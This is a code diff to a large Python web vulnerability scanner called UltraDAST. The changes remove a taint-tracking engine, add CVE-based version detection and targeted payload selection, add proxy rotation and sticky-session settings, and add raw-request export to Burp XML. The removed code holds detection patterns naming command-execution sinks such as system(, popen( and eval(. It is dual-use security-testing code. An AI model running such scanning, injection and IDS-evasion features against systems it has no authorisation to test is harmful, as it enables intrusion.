-                    enable_taint_tracking=True
-                )
-                self.log("Taint tracking engine initialized with symbolic execution capabilities")
-            except RecursionError as e:
-                logging.error(f"RecursionError during taint tracking initialization: {e}")
-                import traceback
-                traceback.print_exc()
-                self.taint_tracking_enabled = False
-                self.taint_integrated_session = None
-                self.log("Taint tracking disabled due to initialization error")
+        # Taint tracking removed due to RecursionError issues and lack of utility
+        self.taint_tracking_enabled = False
+        self.taint_integrated_session = None
         
         if self.config.get('resume_scan'):
             prev_state = self.scan_state_manager.load_state()
@@ -21777,10 +24582,7 @@ class OmegaDAST:
             self.log(f"Restored from checkpoint: {len(self.crawler_engine.visited_urls)} URLs, {len(self.reporting_engine.vulnerabilities)} vulnerabilities")
         if self.validation_enabled:
             # Use the appropriate session for validation
-            if self.taint_integrated_session:
-                session_to_use = self.taint_integrated_session.session_manager
-            else:
-                session_to_use = self.session_manager.async_session.session if self.session_manager.async_session else None
+            session_to_use = self.session_manager.async_session.session if self.session_manager.async_session else None
             self.validation_engine = ValidationEngine(session_to_use, self.config)
             
             # Initialize Surgical Mode Orchestrator if intelligent verification is enabled
@@ -21790,6 +24592,100 @@ class OmegaDAST:
             else:
                 self.surgical_orchestrator = None
                 self.log("Validation Engine initialized for 3x validation and remediation testing")
+    
+    async def _perform_version_detection(self):
+        """
+        Perform software version detection and CVE analysis.
+        This replaces blind payload injection with intelligent version-based vulnerability testing.
+        """
+        try:
+            # Fetch the target homepage for version detection
+            resp = await self._async_fetch(self.target)
+            if not resp:
+                self.log("Version detection: Could not fetch target homepage")
+                return
+            
+            headers = dict(resp.headers) if hasattr(resp, 'headers') else {}
+            html_content = resp.text if hasattr(resp, 'text') else ''
+            
+            # Extract JavaScript content for analysis
+            js_content = ''
+            try:
+                from bs4 import BeautifulSoup
+                soup = BeautifulSoup(html_content, 'html.parser')
+                scripts = soup.find_all('script')
+                for script in scripts:
+                    if script.string:
+                        js_content += script.string + '\n'
+                    elif script.get('src'):
+                        script_url = urljoin(self.target, script['src'])
+                        script_resp = await self._async_fetch(script_url)
+                        if script_resp and hasattr(script_resp, 'text'):
+                            js_content += script_resp.text + '\n'
+            except Exception as e:
+                logging.debug(f"JavaScript extraction failed: {e}")
+            
+            # Get cookies
+            cookies = {}
+            if hasattr(self.session_manager, 'async_session') and self.session_manager.async_session:
+                if hasattr(self.session_manager.async_session, 'session'):
+                    cookies = dict(self.session_manager.async_session.session.cookie_jar)
+            
+            # Perform version detection
+            detected_software = self.version_detection.detect_software_versions(
+                headers, html_content, js_content, cookies
+            )
+            
+            if detected_software:
+                self.log(f"Version detection complete: Found {len(detected_software)} software components")
+                
+                # Generate version report
+                version_report = self.version_detection.generate_version_report(detected_software)
+                
+                # Log software detection results
+                for software_name, software_data in detected_software.items():
+                    risk_level = software_data.get('is_vulnerable', False)
+                    version = software_data.get('version', 'unknown')
+                    detection_source = software_data.get('detection_source', 'unknown')
+                    
+                    if risk_level:
+                        cve_count = len(software_data.get('cves', []))
+                        self.log(f"[CVE] {software_name} {version} detected via {detection_source} - {cve_count} CVEs found")
+                        
+                        # Add vulnerability findings for detected CVEs
+                        for cve in software_data.get('cves', []):
+                            cve_finding = {
+                                'type': f'CVE Vulnerability ({software_name})',
+                                'url': self.target,
+                                'parameter': 'N/A',
+                                'confidence': 'Critical',
+                                'severity': cve.get('severity', 'HIGH'),
+                                'cwe': cve.get('cve_id', 'CVE'),
+                                'evidence': f"{cve['cve_id']} affects {software_name} {version} - CVSS: {cve.get('cvss_score', 0.0)}"
+                            }
+                            self.add_finding(cve_finding)
+                    else:
+                        self.log(f"[INFO] {software_name} {version} detected via {detection_source} - No known CVEs")
+                
+                # Get targeted payloads based on detected vulnerabilities
+                targeted_payloads = self.version_detection.get_targeted_payloads(detected_software)
+                if targeted_payloads:
+                    self.log(f"[CVE] Generated {len(targeted_payloads)} targeted payload sets for detected vulnerabilities")
+                    
+                    # Store targeted payloads for use in injection testing
+                    self.targeted_payloads = targeted_payloads
+                else:
+                    self.targeted_payloads = {}
+                    
+            else:
+                self.log("Version detection: No software components detected")
+                self.targeted_payloads = {}
+                
+        except Exception as e:
+            logging.error(f"Version detection error: {e}")
+            import traceback
+            traceback.print_exc()
+            self.targeted_payloads = {}
         if self.config.get('js_render', True):
             self.selenium_driver = JSRenderDriver(
                 proxy=self.config.get('proxy'),
@@ -21823,6 +24719,14 @@ class OmegaDAST:
         estimated_params = estimated_urls * 5
         self.total_tasks = estimated_urls + estimated_params + 10
         self.current_task = 0
+        
+        # Perform software version detection and CVE analysis
+        self.log("Starting software version detection and CVE analysis...")
+        try:
+            await self._perform_version_detection()
+        except Exception as e:
+            self.log(f"Version detection failed: {e}")
+            logging.warning(f"Version detection error: {e}")
         
         # Subdomain discovery
         self.log("Starting subdomain discovery...")
@@ -21971,10 +24875,6 @@ class OmegaDAST:
         else:
             self.log("JWT testing skipped - pyjwt library not available")
         await self.injection_engine.run_tests()
-        
-        # Run taint tracking analysis if enabled
-        if self.taint_tracking_enabled and self.taint_integrated_session:
-            await self.run_taint_tracking_analysis()
         
         # Run genetic fuzzing if enabled
         if self.config.get('genetic_fuzzing_enabled', False):
@@ -24794,56 +27694,6 @@ class OmegaDAST:
             except Exception as e:
                 logging.debug(f"Session fixation test error for {page['url']}: {e}")
 
-    async def run_taint_tracking_analysis(self):
-        """Run comprehensive taint tracking analysis on discovered URLs"""
-        self.log("Starting taint tracking and symbolic execution analysis...")
-        if not self.taint_integrated_session:
-            self.log("Taint tracking session not available, skipping analysis")
-            return
-        taint_results = self.taint_integrated_session.get_taint_results()
-        self.log(f"Found {len(taint_results)} taint analysis results from scan")
-        for result in taint_results:
-            for vuln in result.get('vulnerabilities', []):
-                vuln['discovery_method'] = 'taint_tracking_symbolic_execution'
-                vuln['scan_phase'] = 'taint_analysis'
-                self.reporting_engine.vulnerabilities.append(vuln)
-                self.log(f"[TAINT TRACKING] {vuln['type']} detected: {vuln['evidence']}")
-                self.add_finding(vuln)
-        taint_report = self.taint_integrated_session.get_taint_report()
-        self.log(f"Taint tracking summary: {taint_report['total_taint_sources']} sources, "
-                f"{taint_report['total_propagation_events']} propagation events, "
-                f"{taint_report['total_flows_detected']} flows detected")
-        await self.run_targeted_taint_analysis()
-
-    async def run_targeted_taint_analysis(self):
-        """Run targeted taint analysis on specific high-risk endpoints"""
-        self.log("Running targeted taint analysis on high-risk endpoints...")
-        high_risk_params = ['id', 'user', 'search', 'query', 'file', 'path', 'redirect', 'callback']
-        for url in list(self.crawler_engine.visited_urls)[:50]:
-            parsed = urlparse(url)
-            params = parse_qs(parsed.query)
-            for param_name in params:
-                if any(risk in param_name.lower() for risk in high_risk_params):
-                    try:
-                        session = self.taint_integrated_session.session_manager if self.taint_integrated_session else self.session_manager
-                        if self.taint_tracker:
-                            self.taint_tracker.mark_tainted(
-                                params[param_name][0],
-                                'query_param',
-                                f"{url}?{param_name}"
-                            )
-                        response = await session.request('GET', url)
-                        if hasattr(response, '_taint_analysis'):
-                            taint_analysis = response._taint_analysis
-                            if taint_analysis.get('tainted'):
-                                self.log(f"[TAINT] Taint propagation detected at {url} via {param_name}")
-                                for vuln in taint_analysis.get('vulnerabilities', []):
-                                    vuln['targeted_parameter'] = param_name
-                                    vuln['url'] = url
-                                    await self._add_vulnerability(vuln)
-                    except Exception as e:
-                        logging.debug(f"Targeted taint analysis error for {url}: {e}")
-
     async def run_genetic_fuzzing(self):
         """Run genetic algorithm-based fuzzing on discovered endpoints"""
         self.log("Starting genetic fuzzing...")
@@ -25054,6 +27904,11 @@ class OmegaDAST:
         
         vuln_type = vuln_type_map.get(mutation.get('mutation_type', 'unknown'), 'DataFlow')
         
+        # Build raw request for export
+        headers = result.get('headers', {})
+        payload = mutation.get('value', '')
+        raw_request = self._build_raw_request_for_storage(method, url, headers, payload)
+
         return {
             'type': vuln_type,
             'url': url,
@@ -25066,9 +27921,37 @@ class OmegaDAST:
             'response_status': response.get('status'),
             'response_length': response.get('response_length'),
             'discovery_method': 'schema_aware_fuzzing',
-            'cwe': self._get_cwe_for_vuln_type(vuln_type)
+            'cwe': self._get_cwe_for_vuln_type(vuln_type),
+            'raw_request': raw_request,
+            'request_headers': headers,
         }
     
+    def _build_raw_request_for_storage(self, method, url, headers, payload):
+        """Helper method to build raw HTTP request for storage/export"""
+        parsed_url = urlparse(url)
+        path = parsed_url.path or '/'
+        if parsed_url.query:
+            path += '?' + parsed_url.query
+        
+        raw_request = f"{method} {path} HTTP/1.1\r\n"
+        raw_request += f"Host: {parsed_url.netloc}\r\n"
+        
+        for header_name, header_value in headers.items():
+            raw_request += f"{header_name}: {header_value}\r\n"
+        
+        if payload:
+            if isinstance(payload, dict):
+                body_str = json.dumps(payload)
+            else:
+                body_str = str(payload)
+            raw_request += f"Content-Length: {len(body_str)}\r\n"
+            raw_request += "\r\n"
+            raw_request += body_str
+        else:
+            raw_request += "\r\n"
+        
+        return raw_request
+
     def _get_cwe_for_vuln_type(self, vuln_type):
         """Map vulnerability types to CWE identifiers"""
         cwe_map = {
@@ -25655,56 +28538,6 @@ class GraphQLSelfReferencingFragmentGenerator:
                         break
             except Exception as e:
                 logging.debug(f"Session fixation test error for {page['url']}: {e}")
-
-    async def run_taint_tracking_analysis(self):
-        """Run comprehensive taint tracking analysis on discovered URLs"""
-        self.log("Starting taint tracking and symbolic execution analysis...")
-        if not self.taint_integrated_session:
-            self.log("Taint tracking session not available, skipping analysis")
-            return
-        taint_results = self.taint_integrated_session.get_taint_results()
-        self.log(f"Found {len(taint_results)} taint analysis results from scan")
-        for result in taint_results:
-            for vuln in result.get('vulnerabilities', []):
-                vuln['discovery_method'] = 'taint_tracking_symbolic_execution'
-                vuln['scan_phase'] = 'taint_analysis'
-                self.reporting_engine.vulnerabilities.append(vuln)
-                self.log(f"[TAINT TRACKING] {vuln['type']} detected: {vuln['evidence']}")
-                self.add_finding(vuln)
-        taint_report = self.taint_integrated_session.get_taint_report()
-        self.log(f"Taint tracking summary: {taint_report['total_taint_sources']} sources, "
-                f"{taint_report['total_propagation_events']} propagation events, "
-                f"{taint_report['total_flows_detected']} flows detected")
-        await self.run_targeted_taint_analysis()
-
-    async def run_targeted_taint_analysis(self):
-        """Run targeted taint analysis on specific high-risk endpoints"""
-        self.log("Running targeted taint analysis on high-risk endpoints...")
-        high_risk_params = ['id', 'user', 'search', 'query', 'file', 'path', 'redirect', 'callback']
-        for url in list(self.crawler_engine.visited_urls)[:50]:
-            parsed = urlparse(url)
-            params = parse_qs(parsed.query)
-            for param_name in params:
-                if any(risk in param_name.lower() for risk in high_risk_params):
-                    try:
-                        session = self.taint_integrated_session.session_manager if self.taint_integrated_session else self.session_manager
-                        if self.taint_tracker:
-                            self.taint_tracker.mark_tainted(
-                                params[param_name][0],
-                                'query_param',
-                                f"{url}?{param_name}"
-                            )
-                        response = await session.request('GET', url)
-                        if hasattr(response, '_taint_analysis'):
-                            taint_analysis = response._taint_analysis
-                            if taint_analysis.get('tainted'):
-                                self.log(f"[TAINT] Taint propagation detected at {url} via {param_name}")
-                                for vuln in taint_analysis.get('vulnerabilities', []):
-                                    vuln['targeted_parameter'] = param_name
-                                    self.reporting_engine.vulnerabilities.append(vuln)
-                                    self.add_finding(vuln)
-                    except Exception as e:
-                        logging.exception(f"Targeted taint analysis error for {url}: {e}")
 
     async def run_genetic_fuzzing(self):
         """Run genetic fuzzing using the integrated genetic fuzzer"""
@@ -27084,6 +29917,24 @@ class ProxyTab(QWidget):
         self.max_failure_rate_spin.setToolTip("Maximum failure rate before proxy is marked unhealthy")
         config_form.addRow("Max Failure Rate:", self.max_failure_rate_spin)
         
+        # Auto-healing settings
+        self.auto_healing_cb = QCheckBox("Enable Auto-Healing")
+        self.auto_healing_cb.setChecked(True)
+        self.auto_healing_cb.setToolTip("Dynamically increase max_failure_rate when >80% of proxies fail within 60 seconds")
+        config_form.addRow("Auto-Healing:", self.auto_healing_cb)
+        
+        # Sticky session settings
+        self.sticky_session_cb = QCheckBox("Enable Sticky Session")
+        self.sticky_session_cb.setChecked(False)
+        self.sticky_session_cb.setToolTip("Maintain same IP during multi-step operations (e.g., Add-to-Cart -> Checkout)")
+        config_form.addRow("Sticky Session:", self.sticky_session_cb)
+        
+        self.sticky_session_duration_spin = QSpinBox()
+        self.sticky_session_duration_spin.setRange(60, 3600)
+        self.sticky_session_duration_spin.setValue(600)
+        self.sticky_session_duration_spin.setToolTip("Sticky session duration in seconds")
+        config_form.addRow("Sticky Duration:", self.sticky_session_duration_spin)
+        
         config_group.setLayout(config_form)
         layout.addWidget(config_group)
         
@@ -27172,6 +30023,16 @@ class ProxyTab(QWidget):
         
         pool_actions_layout.addStretch()
         layout.addLayout(pool_actions_layout)
+        
+        # Apply Configuration Button
+        apply_config_layout = QHBoxLayout()
+        apply_config_layout.setSpacing(12)
+        
+        self.apply_proxy_config_btn = QPushButton("✅ Apply Configuration")
+        self.apply_proxy_config_btn.clicked.connect(self.apply_proxy_pool_config)
+        apply_config_layout.addWidget(self.apply_proxy_config_btn)
+        
+        layout.addLayout(apply_config_layout)
     def toggle_proxy(self):
         if not self.proxy_running:
             self.proxy_handler = MITMProxyHandler(port=self.port_spin.value(), callback=self.on_captured)
@@ -27372,6 +30233,32 @@ class ProxyTab(QWidget):
             self.proxy_pool.proxy_configs.clear()
             self.update_proxy_table()
             self.update_proxy_stats()
+    
+    def apply_proxy_pool_config(self):
+        """Apply proxy pool configuration including auto-healing and sticky session settings"""
+        self.proxy_pool.enable_rotation = self.enable_rotation_cb.isChecked()
+        self.proxy_pool.rotation_interval = self.rotation_interval_spin.value()
+        self.proxy_pool.health_check_interval = self.health_check_interval_spin.value()
+        self.proxy_pool.prefer_geo_diverse = self.geo_diverse_cb.isChecked()
+        self.proxy_pool.max_failure_rate = self.max_failure_rate_spin.value()
+        self.proxy_pool.auto_healing_enabled = self.auto_healing_cb.isChecked()
+        self.proxy_pool.sticky_session_enabled = self.sticky_session_cb.isChecked()
+        self.proxy_pool.sticky_session_duration = self.sticky_session_duration_spin.value()
+        
+        config_status = f"Configuration applied:\n"
+        config_status += f"Rotation: {self.proxy_pool.enable_rotation}\n"
+        config_status += f"Rotation Interval: {self.proxy_pool.rotation_interval}\n"
+        config_status += f"Health Check Interval: {self.proxy_pool.health_check_interval}s\n"
+        config_status += f"Geo-Diverse: {self.proxy_pool.prefer_geo_diverse}\n"
+        config_status += f"Max Failure Rate: {self.proxy_pool.max_failure_rate:.1%}\n"
+        config_status += f"Auto-Healing: {self.proxy_pool.auto_healing_enabled}\n"
+        config_status += f"Sticky Session: {self.proxy_pool.sticky_session_enabled}\n"
+        if self.proxy_pool.sticky_session_enabled:
+            config_status += f"Sticky Duration: {self.proxy_pool.sticky_session_duration}s\n"
+        
+        self.stats_label.setText(config_status.replace('\n', ' | '))
+        QMessageBox.information(self, "Configuration Applied", 
+                                f"Proxy pool configuration has been applied successfully.\n\n{config_status}")
             
     def setup_throttling_tab(self):
         """Setup the IDS/IPS throttling configuration tab"""
@@ -27812,13 +30699,79 @@ class RepeaterTab(QWidget):
         self.response_area.setReadOnly(True)
         self.response_area.setFont(QFont("Consolas", 9))
         layout.addWidget(self.response_area)
+        
+        # Raw Request Area
+        raw_request_label = QLabel("📄 Raw HTTP Request")
+        raw_request_label.setStyleSheet("QLabel { font-weight: 600; font-size: 13px; }")
+        layout.addWidget(raw_request_label)
+        
+        self.raw_request_area = QPlainTextEdit()
+        self.raw_request_area.setReadOnly(True)
+        self.raw_request_area.setFont(QFont("Consolas", 9))
+        self.raw_request_area.setMaximumHeight(150)
+        layout.addWidget(self.raw_request_area)
+        
+        # Copy Raw Request Button
+        copy_raw_btn = QPushButton("📋 Copy Raw Request")
+        copy_raw_btn.clicked.connect(self.copy_raw_request)
+        layout.addWidget(copy_raw_btn)
+        
+        # Store raw request data
+        self.last_raw_request = ""
+        self.last_raw_response = ""
     
     def clear_form(self):
         self.url_input.clear()
         self.headers_input.clear()
         self.body_input.clear()
         self.response_area.clear()
+        self.raw_request_area.clear()
         self.status_label.setText("Ready")
+        self.last_raw_request = ""
+        self.last_raw_response = ""
+        
+    def copy_raw_request(self):
+        """Copy the raw HTTP request to clipboard"""
+        if self.last_raw_request:
+            from PyQt5.QtWidgets import QApplication
+            clipboard = QApplication.clipboard()
+            clipboard.setText(self.last_raw_request)
+            self.status_label.setText("Raw request copied to clipboard")
+            self.status_label.setStyleSheet("QLabel { font-weight: 600; padding: 12px; background-color: #e8f5e9; border-radius: 8px; color: #2e7d32; }")
+        else:
+            self.status_label.setText("No raw request to copy")
+            self.status_label.setStyleSheet("QLabel { font-weight: 600; padding: 12px; background-color: #ffebee; border-radius: 8px; color: #c62828; }")
+    
+    def build_raw_request(self, method, url, headers, body):
+        """Build the exact byte-level raw HTTP request with \r\n line endings"""
+        parsed_url = urlparse(url)
+        path = parsed_url.path or '/'
+        if parsed_url.query:
+            path += '?' + parsed_url.query
+        
+        # Build request line with exact formatting
+        raw_request = f"{method} {path} HTTP/1.1\r\n"
+        
+        # Add Host header (required for HTTP/1.1)
+        raw_request += f"Host: {parsed_url.netloc}\r\n"
+        
+        # Add headers with exact casing and ordering as provided
+        for header_name, header_value in headers.items():
+            raw_request += f"{header_name}: {header_value}\r\n"
+        
+        # Add Content-Length if body exists
+        if body:
+            if isinstance(body, dict):
+                body_str = json.dumps(body)
+            else:
+                body_str = str(body)
+            raw_request += f"Content-Length: {len(body_str)}\r\n"
+            raw_request += "\r\n"
+            raw_request += body_str
+        else:
+            raw_request += "\r\n"
+        
+        return raw_request
     def send_request(self):
         method = self.method_combo.currentText()
         url = self.url_input.text().strip()
@@ -27887,7 +30840,10 @@ class RepeaterTab(QWidget):
                                     if field_name not in body:
                                         body[field_name] = token_value
                                         logging.info(f"[REPEATER CSRF] Injected {field_name} into POST request")
-                            
+                        
+                        # Build raw request before sending
+                        raw_request = self.build_raw_request(method, url, headers, body)
+                        
                         if method == "GET":
                             async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                 text = await resp.text()
@@ -27925,13 +30881,29 @@ class RepeaterTab(QWidget):
                                 resp_headers = dict(resp.headers)
                         else:
                             raise ValueError(f"Unsupported method: {method}")
-                        return status, resp_headers, text
+                        
+                        # Build raw response
+                        raw_response = f"HTTP/1.1 {status} {resp.status}\r\n"
+                        for header_name, header_value in resp_headers.items():
+                            raw_response += f"{header_name}: {header_value}\r\n"
+                        raw_response += "\r\n"
+                        raw_response += text
+                        
+                        return status, resp_headers, text, raw_request, raw_response
                 loop = asyncio.new_event_loop()
                 asyncio.set_event_loop(loop)
                 try:
-                    status, resp_headers, text = loop.run_until_complete(async_send())
+                    status, resp_headers, text, raw_request, raw_response = loop.run_until_complete(async_send())
                 finally:
                     loop.close()
+                
+                # Store raw request and response for export
+                self.last_raw_request = raw_request
+                self.last_raw_response = raw_response
+                
+                # Display raw request in the raw request area
+                self.raw_request_area.setPlainText(raw_request)
+                
                 response_text = f"Status: {status}\n"
                 response_text += f"Headers:\n{json.dumps(resp_headers, indent=2)}\n\n"
                 response_text += f"Body:\n{text}"
@@ -28101,9 +31073,6 @@ class ScanTab(QWidget):
         advanced_layout.setSpacing(8)
         advanced_layout.setContentsMargins(16, 20, 16, 16)
         
-        self.taint_tracking_enabled = QCheckBox("Enable Taint Tracking")
-        self.taint_tracking_enabled.setChecked(True)
-        
         self.symbolic_execution_enabled = QCheckBox("Enable Symbolic Execution")
         self.symbolic_execution_enabled.setChecked(True)
         
@@ -28134,7 +31103,6 @@ class ScanTab(QWidget):
         self.schema_confidence_spin.setSuffix("%")
         self.schema_confidence_spin.setToolTip("Minimum confidence threshold for schema inference (0-100%)")
         
-        advanced_layout.addWidget(self.taint_tracking_enabled)
         advanced_layout.addWidget(self.symbolic_execution_enabled)
         advanced_layout.addWidget(self.dynamic_payloads_enabled)
         advanced_layout.addWidget(self.environment_detection_enabled)
@@ -28453,7 +31421,6 @@ class ScanTab(QWidget):
                 'randomize_case': self.randomize_case.isChecked(),
                 'browser_simulation': self.browser_simulation.isChecked()
             },
-            'taint_tracking_enabled': self.taint_tracking_enabled.isChecked(),
             'symbolic_execution_enabled': self.symbolic_execution_enabled.isChecked(),
             'schema_inference': {
                 'enabled': self.schema_inference_enabled_check.isChecked(),
@@ -28552,11 +31519,7 @@ class ScanTab(QWidget):
         row = self.findings_table.rowCount()
         self.findings_table.insertRow(row)
         
-        # Highlight taint tracking findings with different color
         vuln_type = vuln.get('type', '')
-        if vuln.get('detection_method') == 'dynamic_taint_tracking':
-            vuln_type = f"[TAINT] {vuln_type}"
-        
         self.findings_table.setItem(row, 0, QTableWidgetItem(vuln_type))
         self.findings_table.setItem(row, 1, QTableWidgetItem(vuln['url']))
         self.findings_table.setItem(row, 2, QTableWidgetItem(vuln.get('parameter','')))
@@ -28755,7 +31718,7 @@ class ScanTab(QWidget):
 class MainWindow(QMainWindow):
     def __init__(self):
         QMainWindow.__init__(self)
-        self.setWindowTitle("UltraDAST v15.2 – Unstoppable Pentester")
+        self.setWindowTitle("UltraDAST v16.0 – Unstoppable Pentester")
         self.resize(1600, 1000)
         # Set reasonable minimum size constraints (no maximum for full adjustability)
         self.setMinimumSize(1200, 800)
@@ -29674,6 +32637,20 @@ class MainWindow(QMainWindow):
                     item = current_tab.findings_table.item(row, 0)
                     vuln = item.data(Qt.UserRole) if item else {}
                     evidence = vuln.get('evidence', '')
+                    
+                    # Get raw request if available
+                    raw_request = vuln.get('raw_request', '')
+                    if not raw_request and vuln.get('request_headers'):
+                        # Build raw request from stored components if raw_request not available
+                        method = vuln.get('method', 'GET')
+                        req_headers = vuln.get('request_headers', {})
+                        payload = vuln.get('payload', '')
+                        raw_request = self._build_raw_request_for_export(method, url, req_headers, payload)
+                    
+                    # Escape XML special characters
+                    def escape_xml(text):
+                        return str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&apos;')
+                    
                     xml += f"""<issue>
     <serialNumber>{row}</serialNumber>
     <type>{vuln_type}</type>
@@ -29683,12 +32660,79 @@ class MainWindow(QMainWindow):
     <location>{url}</location>
     <severity>{severity}</severity>
     <confidence>{confidence}</confidence>
-    <issueDetail>{evidence}</issueDetail>
+    <issueDetail>{escape_xml(evidence)}</issueDetail>
+    <request>{escape_xml(raw_request)}</request>
 </issue>\n"""
                 xml += '</issues>'
                 with open(filename, 'w') as f:
                     f.write(xml)
                 self.statusBar().showMessage(f"Burp XML exported to {filename}")
+        elif isinstance(current_tab, RepeaterTab):
+            # Export from Repeater tab
+            filename, _ = QFileDialog.getSaveFileName(self, "Export Burp XML", "", "XML Files (*.xml)")
+            if filename:
+                xml = '<?xml version="1.0"?>\n<issues>\n'
+                
+                # Build raw request from Repeater tab data
+                method = current_tab.method_combo.currentText()
+                url = current_tab.url_input.text().strip()
+                headers_text = current_tab.headers_input.toPlainText().strip()
+                body_text = current_tab.body_input.toPlainText().strip()
+                
+                try:
+                    headers = json.loads(headers_text) if headers_text else {}
+                    body = json.loads(body_text) if body_text else None
+                except json.JSONDecodeError:
+                    headers = {}
+                    body = body_text if body_text else None
+                
+                raw_request = current_tab.build_raw_request(method, url, headers, body)
+                
+                def escape_xml(text):
+                    return str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&apos;')
+                
+                xml += f"""<issue>
+    <serialNumber>0</serialNumber>
+    <type>Repeater Request</type>
+    <name>Repeater Request</name>
+    <host ip="unknown">{urlparse(url).hostname if url else 'unknown'}</host>
+    <path>{urlparse(url).path if url else '/'}</path>
+    <location>{url}</location>
+    <severity>Info</severity>
+    <confidence>100</confidence>
+    <issueDetail>Manual request from Repeater tab</issueDetail>
+    <request>{escape_xml(raw_request)}</request>
+</issue>\n"""
+                xml += '</issues>'
+                with open(filename, 'w') as f:
+                    f.write(xml)
+                self.statusBar().showMessage(f"Burp XML exported to {filename}")
+    
+    def _build_raw_request_for_export(self, method, url, headers, body):
+        """Helper function to build raw request for export (similar to RepeaterTab method)"""
+        parsed_url = urlparse(url)
+        path = parsed_url.path or '/'
+        if parsed_url.query:
+            path += '?' + parsed_url.query
+        
+        raw_request = f"{method} {path} HTTP/1.1\r\n"
+        raw_request += f"Host: {parsed_url.netloc}\r\n"
+        
+        for header_name, header_value in headers.items():
+            raw_request += f"{header_name}: {header_value}\r\n"
+        
+        if body:
+            if isinstance(body, dict):
+                body_str = json.dumps(body)
+            else:
+                body_str = str(body)
+            raw_request += f"Content-Length: {len(body_str)}\r\n"
+            raw_request += "\r\n"
+            raw_request += body_str
+        else:
+            raw_request += "\r\n"
+        
+        return raw_request
     def export_pdf_report(self):
         try:
             from reportlab.lib.pagesizes import letter
@@ -29757,7 +32801,7 @@ class MainWindow(QMainWindow):
                         ['Low', str(severity_counts['Low'])],
                         ['Info', str(severity_counts['Info'])],
                         ['Scan Date', datetime.now().strftime('%Y-%m-%d %H:%M:%S')],
-                        ['Tool Version', 'UltraDAST v15.2']
+                        ['Tool Version', 'UltraDAST v16.0']
                     ]
                     summary_table = Table(summary_data, colWidths=[2*inch, 2*inch])
                     summary_table.setStyle(TableStyle([
@@ -29868,7 +32912,7 @@ class MainWindow(QMainWindow):
                     report = {
                         "scan_info": {
                             "timestamp": datetime.now().isoformat(),
-                            "tool": "UltraDAST v15.2",
+                            "tool": "UltraDAST v16.0",
                             "total_findings": current_tab.findings_table.rowCount()
                         },
                         "vulnerabilities": []
@@ -30149,7 +33193,7 @@ def main():
         
         # Parse command-line arguments for safety controls
         parser = argparse.ArgumentParser(
-            description='ULTRA-DAST v15.2 - Advanced Security Scanner with Safety Controls',
+            description='ULTRA-DAST v16.0 - Advanced Security Scanner with Safety Controls',
             formatter_class=argparse.RawDescriptionHelpFormatter,
             epilog="""
 Reconnaissance Maturity Model:
@@ -32261,792 +35305,6 @@ def integrate_genetic_fuzzing(target_url, session_manager, mutation_rate=0.1, cr
     results = genetic_fuzzer.run(loop, seed_data)
 
     return results
-
-
-# ================================================================================
-# TAINT TRACKING & SYMBOLIC EXECUTION ENGINE
-# ================================================================================
-
-class TaintTracker:
-    """
-    Dynamic taint tracking system for detecting data flow from HTTP inputs to sinks.
-    Tracks taint propagation through application responses and identifies potential
-    security vulnerabilities when tainted data reaches sensitive operations.
-    """
-    
-    # Taint sources - where untrusted data enters the application
-    TAINT_SOURCES = {
-        'query_params': ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
-        'headers': ['Cookie', 'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP'],
-        'cookies': ['sessionid', 'auth_token', 'jwt', 'csrftoken'],
-        'body_fields': ['username', 'password', 'email', 'search', 'query', 'input'],
-        'path_params': ['id', 'uuid', 'slug', 'user_id']
-    }
-    
-    # Taint sinks - where tainted data could cause security issues
-    TAINT_SINKS = {
-        'sql_execution': [
-            r'SELECT.*FROM',
-            r'INSERT.*INTO',
-            r'UPDATE.*SET',
-            r'DELETE.*FROM',
-            r'DROP.*TABLE',
-            r'UNION.*SELECT',
-            r'exec\(',
-            r'execute\(',
-            r'query\(',
-            r'raw\('
-        ],
-        'command_execution': [
-            r'system\(',
-            r'exec\(',
-            r'shell_exec\(',
-            r'popen\(',
-            r'passthru\(',
-            r'subprocess\.call',
-            r'os\.system',
-            r'eval\(',
-            r'assert\('
-        ],
-        'file_operations': [
-            r'fopen\(',
-            r'file_get_contents\(',
-            r'file_put_contents\(',
-            r'include\(',
-            r'require\(',
-            r'open\(',
-            r'File\(',
-            r'Path\('
-        ],
-        'output_sinks': [
-            r'echo\s+',
-            r'print\s+',
-            r'document\.write',
-            r'innerHTML\s*=',
-            r'outerHTML\s*=',
-            r'href\s*=',
-            r'src\s*=',
-            r'action\s*=',
-            r'redirect\(',
-            r'header\('
-        ],
-        'header_injection': [
-            r'Set-Cookie:',
-            r'Location:',
-            r'Refresh:',
-            r'Content-Type:'
-        ]
-    }
-    
-    def __init__(self):
-        try:
-            self.taint_map = {}  # Maps taint IDs to source information
-            self.reverse_map = {}  # Maps response content to taint IDs
-            self.taint_propagation = []  # Tracks propagation paths
-            self.detected_flows = []  # Stores detected taint flows
-            self.symbolic_states = {}  # Symbolic execution states
-            self.session_id = str(uuid.uuid4())
-        except RecursionError as e:
-            import traceback
-            logging.error(f"RecursionError in TaintTracker.__init__: {e}")
-            traceback.print_exc()
-            raise
-        
-    def generate_taint_id(self, source_type: str, source_value: str, location: str) -> str:
-        """Generate a unique taint identifier for tracking"""
-        taint_id = f"taint_{hashlib.md5(f'{self.session_id}_{source_type}_{source_value}_{location}'.encode()).hexdigest()[:16]}"
-        self.taint_map[taint_id] = {
-            'source_type': source_type,
-            'source_value': source_value,
-            'location': location,
-            'timestamp': datetime.now().isoformat(),
-            'propagation_count': 0
-        }
-        return taint_id
-    
-    def normalize_payload(self, data: str) -> str:
-        """Normalize payloads by decoding various encodings before taint checking"""
-        if not data:
-            return data
-        
-        normalized = data
-        
-        # Try URL decoding
-        try:
-            # Multiple levels of URL decoding
-            for _ in range(3):
-                if '%' in normalized:
-                    decoded = unquote(normalized)
-                    if decoded != normalized:
-                        normalized = decoded
-                    else:
-                        break
-        except Exception:
-            pass
-        
-        # Try HTML unescaping
-        try:
-            unescaped = html.unescape(normalized)
-            if unescaped != normalized:
-                normalized = unescaped
-        except Exception:
-            pass
-        
-        # Try Base64 decoding
-        try:
-            # Attempt to detect and decode Base64
-            base64_pattern = r'^[A-Za-z0-9+/]+=*$'
-            if re.match(base64_pattern, normalized.strip()):
-                # Remove padding if needed
-                padded = normalized.strip()
-                while len(padded) % 4:
-                    padded += '='
-                decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
-                if decoded and decoded != normalized:
